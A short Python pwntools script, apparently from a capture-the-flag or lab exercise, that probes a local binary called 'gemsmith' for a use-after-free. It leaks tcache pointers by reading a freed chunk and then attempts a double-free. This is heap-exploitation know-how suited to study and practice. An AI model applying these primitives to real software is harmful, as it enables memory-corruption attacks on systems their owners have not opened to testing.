#!/usr/bin/env python3
"""
Simple UAF test through delete()
Key: delete() is safe (doesn't exit), has UAF
"""

from pwn import *
context.log_level = 'warn'

p = process('./gemsmith', level='error')

# Op 1: Allocate
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'0')
p.sendlineafter(b':', b'100')
p.sendlineafter(b':', b'TESTDATA')

# Op 2: Delete (UAF - buf[0] still points to freed chunk)
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'0')
print("[+] Deleted - chunk in tcache, buf[0] has UAF")

# Op 3: Show (will print tcache fd pointer if not NULL)
p.sendlineafter(b'>', b'3')
p.sendlineafter(b':', b'0')

output = p.recvuntil(b'>', timeout=2)
print("\n=== SHOW OUTPUT (tcache metadata) ===")
# Look for the actual output between prompts
lines = output.decode('utf-8', errors='replace').split('\n')
for line in lines:
    if line.strip() and '［' not in line and '＋' not in line and '｜' not in line and '＞' not in line:
        print(f"  {line}")

# Op 4: Delete again (double-free via UAF!)
print("\n[*] Attempting double-free via UAF...")
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'0')

# See what happens
try:
    result = p.recvall(timeout=2)
    print("\n=== RESULT ===")
    print(result.decode('utf-8', errors='replace'))
except:
    pass

p.close()
